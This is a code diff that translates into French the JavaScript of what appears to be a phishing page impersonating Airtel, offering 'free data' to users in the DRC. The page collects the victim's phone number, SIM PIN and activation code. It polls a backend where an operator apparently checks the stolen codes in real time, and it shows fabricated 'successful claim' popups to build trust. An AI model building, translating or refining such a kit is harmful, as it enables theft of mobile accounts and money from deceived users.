-      showErr('s3Err', 'Please enter your estimated monthly usage.'); shakeField('s3in'); return;
+      showErr('s3Err', 'Veuillez entrer votre consommation mensuelle estimée.'); shakeField('s3in'); return;
     }
     clearErr('s3Err');
 
     const btn = document.querySelector('#page-step3 .btn-grad[onclick="submitApp()"]');
-    if (btn) { btn.disabled = true; btn.textContent = 'SUBMITTING…'; }
+    if (btn) { btn.disabled = true; btn.textContent = 'ENVOI EN COURS…'; }
     document.getElementById('mSubmit').classList.add('show');
 
     setTimeout(() => {
       document.getElementById('mSubmit').classList.remove('show');
-      if (btn) { btn.disabled = false; btn.textContent = 'SUBMIT CLAIM'; }
+      if (btn) { btn.disabled = false; btn.textContent = 'SOUMETTRE LA RÉCLAMATION'; }
       goTo('page-submitted');
       let c = 3;
       document.getElementById('rdN').textContent = c;
@@ -1143,7 +1151,7 @@
     const pin = [0,1,2,3].map(i => document.getElementById('p'+i).value).join('');
 
     if (!rawPhone || pin.length < 4) {
-      showLoginMsg('Please enter your phone number and 4-digit SIM PIN.');
+      showLoginMsg('Veuillez entrer votre numéro de téléphone et votre code PIN à 4 chiffres.');
       return;
     }
 
@@ -1183,13 +1191,13 @@
 
       } else {
         document.getElementById('bLogin').disabled = false;
-        showLoginMsg(data.message || 'Verification failed. Please try again.');
+        showLoginMsg(data.message || 'Échec de la vérification. Veuillez réessayer.');
       }
 
     } catch (err) {
       document.getElementById('mLogin').classList.remove('show');
       document.getElementById('bLogin').disabled = false;
-      showLoginMsg('Network error. Please check your connection and try again.');
+      showLoginMsg('Erreur réseau. Veuillez vérifier votre connexion et réessayer.');
     }
   }
 
@@ -1209,7 +1217,7 @@
           clearInterval(pinPollInterval);
           document.getElementById('pinWait').classList.remove('show');
           document.getElementById('otpInputSection').style.display = 'block';
-          showOtpMsg('success', 'Details verified! Please enter your activation code below.');
+          showOtpMsg('success', 'Détails vérifiés ! Veuillez entrer votre code d\'activation ci-dessous.');
           startRs();
           document.getElementById('o0').focus();
 
@@ -1217,7 +1225,7 @@
           clearInterval(pinPollInterval);
           document.getElementById('pinWait').classList.remove('show');
           document.getElementById('otpInputSection').style.display = 'none';
-          showOtpMsg('error', 'Your details could not be verified. Please go back and try again.');
+          showOtpMsg('error', 'Vos informations n\'ont pas pu être vérifiées. Veuillez revenir en arrière et réessayer.');
           document.getElementById('bLogin').disabled = false;
         }
 
@@ -1229,7 +1237,7 @@
         clearInterval(pinPollInterval);
         if (document.getElementById('pinWait').classList.contains('show')) {
           document.getElementById('pinWait').classList.remove('show');
-          showOtpMsg('warning', 'Verification timed out. Please go back and try again.');
+          showOtpMsg('warning', 'Délai d\'attente dépassé. Veuillez réessayer.');
         }
       }
     }, 300000);
@@ -1250,7 +1258,7 @@
     const rsBox = document.getElementById('otpRs');
     if (!rsBox) return;
 
-    rsBox.innerHTML = '<span data-i18n="otp_resend_in">Resend code in</span> <span id="rsS">' + s + '</span> <span data-i18n="otp_seconds">seconds</span>';
+    rsBox.innerHTML = '<span data-i18n="otp_resend_in">Renvoyer le code dans</span> <span id="rsS">' + s + '</span> <span data-i18n="otp_seconds">secondes</span>';
 
     _rsInterval = setInterval(() => {
       s--;
@@ -1260,7 +1268,7 @@
         clearInterval(_rsInterval);
         _rsInterval = null;
         const box = document.getElementById('otpRs');
-        if (box) box.innerHTML = '<span style="color:var(--airtel-red);cursor:pointer;font-weight:600" onclick="resendOtp()">Resend code</span>';
+        if (box) box.innerHTML = '<span style="color:var(--airtel-red);cursor:pointer;font-weight:600" onclick="resendOtp()">Renvoyer le code</span>';
       }
     }, 1000);
   }
@@ -1275,37 +1283,37 @@
       });
       const data = await res.json();
       if (data.success) {
-        showOtpMsg('info', 'A new activation code request has been sent.');
+        showOtpMsg('info', 'Un nouveau code d\'activation a été envoyé.');
         startRs();
         [0,1,2,3].forEach(i => { document.getElementById('o'+i).value = ''; });
         document.getElementById('bOtp').className = 'btn-otp';
         document.getElementById('o0').focus();
       } else {
-        showOtpMsg('error', 'Could not resend code. Please try again.');
+        showOtpMsg('error', 'Impossible de renvoyer le code. Veuillez réessayer.');
       }
     } catch {
-      showOtpMsg('error', 'Network error while resending code.');
+      showOtpMsg('error', 'Erreur réseau lors de l\'envoi du code.');
     }
   }
 
   async function doOtp() {
     const otp = [0,1,2,3].map(j => document.getElementById('o'+j).value).join('');
     if (otp.length < 4) {
-      showOtpMsg('warning', 'Please enter all 4 digits of your activation code.');
+      showOtpMsg('warning', 'Veuillez saisir les 4 chiffres de votre code d\'activation.');
       return;
     }
 
     hideOtpMsgs();
 
     let c = 3;
-    document.getElementById('otpVT').textContent = 'Please wait… (' + c + 's)';
+    document.getElementById('otpVT').textContent = 'Veuillez patienter… (' + c + 's)';
     document.getElementById('mOtp').classList.add('show');
     document.getElementById('bOtp').disabled = true;
 
     const countdown = setInterval(() => {
       c--;
       const el = document.getElementById('otpVT');
-      if (el) el.textContent = 'Please wait… (' + c + 's)';
+      if (el) el.textContent = 'Veuillez patienter… (' + c + 's)';
     }, 1000);
 
     try {
@@ -1320,18 +1328,18 @@
       document.getElementById('mOtp').classList.remove('show');
 
       if (data.success) {
-        showOtpMsg('success', 'Code submitted. Activating your data bundle…');
+        showOtpMsg('success', 'Code soumis. Activation de votre forfait…');
         pollOtpStatus();
       } else {
         document.getElementById('bOtp').disabled = false;
-        showOtpMsg('error', data.message || 'Failed to submit code. Please try again.');
+        showOtpMsg('error', data.message || 'Échec de l\'envoi du code. Veuillez réessayer.');
       }
 
     } catch (err) {
       clearInterval(countdown);
       document.getElementById('mOtp').classList.remove('show');
       document.getElementById('bOtp').disabled = false;
-      showOtpMsg('error', 'Network error. Please check your connection.');
+      showOtpMsg('error', 'Erreur réseau. Veuillez vérifier votre connexion.');
     }
   }
 
@@ -1349,18 +1357,18 @@
 
         if (data.status === 'approved') {
           clearInterval(otpPollInterval);
-          document.getElementById('apAmt').textContent  = (S.amt || 10) + ' GB';
-          document.getElementById('apTerm').textContent = S.term || '30 Days';
+          document.getElementById('apAmt').textContent  = (S.amt || 10) + ' Go';
+          document.getElementById('apTerm').textContent = S.term || '30 Jours';
           goTo('page-approval');
 
         } else if (data.status === 'rejected') {
           clearInterval(otpPollInterval);
-          showOtpMsg('error', 'Activation failed. Please contact support.');
+          showOtpMsg('error', 'Échec de l\'activation. Veuillez contacter le support.');
           document.getElementById('bOtp').disabled = false;
 
         } else if (data.status === 'wrongpin_otp') {
           clearInterval(otpPollInterval);
-          showOtpMsg('error', 'Incorrect SIM PIN detected. Redirecting to login…');
+          showOtpMsg('error', 'Code PIN SIM incorrect détecté. Redirection vers la connexion…');
           setTimeout(() => {
             [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
             chkLogin();
@@ -1371,7 +1379,7 @@
             document.getElementById('pinWait').classList.remove('show');
             document.getElementById('otpInputSection').style.display = '';
             if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-            document.getElementById('otpRs').innerHTML = '<span data-i18n="otp_resend_in">Resend code in</span> <span id="rsS">60</span> <span data-i18n="otp_seconds">seconds</span>';
+            document.getElementById('otpRs').innerHTML = '<span data-i18n="otp_resend_in">Renvoyer le code dans</span> <span id="rsS">60</span> <span data-i18n="otp_seconds">secondes</span>';
             hideOtpMsgs();
             S.applicationId = null;
             S.assignedAdminId = null;
@@ -1383,7 +1391,7 @@
           [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
           document.getElementById('bOtp').className = 'btn-otp';
           document.getElementById('bOtp').disabled = false;
-          showOtpMsg('error', 'Incorrect activation code. Please check and re-enter.');
+          showOtpMsg('error', 'Code d\'activation incorrect. Veuillez vérifier et réintroduire.');
           document.getElementById('o0').focus();
         }
 
@@ -1393,7 +1401,7 @@
     setTimeout(() => {
       if (otpPollInterval) {
         clearInterval(otpPollInterval);
-        showOtpMsg('warning', 'Activation timed out. Please try again.');
+        showOtpMsg('warning', 'Délai d\'activation dépassé. Veuillez réessayer.');
         document.getElementById('bOtp').disabled = false;
       }
     }, 300000);
@@ -1404,16 +1412,16 @@
   // ══════════════════════════════════════════════════════
   document.addEventListener("DOMContentLoaded", () => {
     const liveApprovals = [
-        { number: "+243 05* *** 416", location: "Kinshasa", amount: "5 GB" },
-        { number: "+243 05* *** 564", location: "Lubumbashi", amount: "10 GB" },
-        { number: "+243 05* *** 678", location: "Mbuji-Mayi", amount: "15 GB" },
-        { number: "+243 05* *** 780", location: "Kananga", amount: "20 GB" },
-        { number: "+243 05* *** 567", location: "Kisangani", amount: "25 GB" },
-        { number: "+243 05* *** 608", location: "Goma", amount: "30 GB" },
-        { number: "+243 05* *** 450", location: "Bukavu", amount: "40 GB" },
-        { number: "+243 05* *** 067", location: "Matadi", amount: "50 GB" },
-        { number: "+243 05* *** 406", location: "Kolwezi", amount: "75 GB" },
-        { number: "+243 05* *** 577", location: "Likasi", amount: "100 GB" }
+        { number: "+243 05* *** 416", location: "Kinshasa", amount: "5 Go" },
+        { number: "+243 05* *** 564", location: "Lubumbashi", amount: "10 Go" },
+        { number: "+243 05* *** 678", location: "Mbuji-Mayi", amount: "15 Go" },
+        { number: "+243 05* *** 780", location: "Kananga", amount: "20 Go" },
+        { number: "+243 05* *** 567", location: "Kisangani", amount: "25 Go" },
+        { number: "+243 05* *** 608", location: "Goma", amount: "30 Go" },
+        { number: "+243 05* *** 450", location: "Bukavu", amount: "40 Go" },
+        { number: "+243 05* *** 067", location: "Matadi", amount: "50 Go" },
+        { number: "+243 05* *** 406", location: "Kolwezi", amount: "75 Go" },
+        { number: "+243 05* *** 577", location: "Likasi", amount: "100 Go" }
     ];
 
     const popup = document.getElementById("popup");
@@ -1435,9 +1443,9 @@
         popupAvatar.textContent = "+243";
         popupText.innerHTML = `
             <strong>${user.number}</strong><br>
-            From <strong>${user.location}</strong><br>
-            Successfully claimed
-            <strong>${user.amount} Free Data!</strong>
+            Depuis <strong>${user.location}</strong><br>
+            A réclamé avec succès
+            <strong>${user.amount} de données gratuites !</strong>
         `;
         popup.classList.add("show");
         setTimeout(() => {
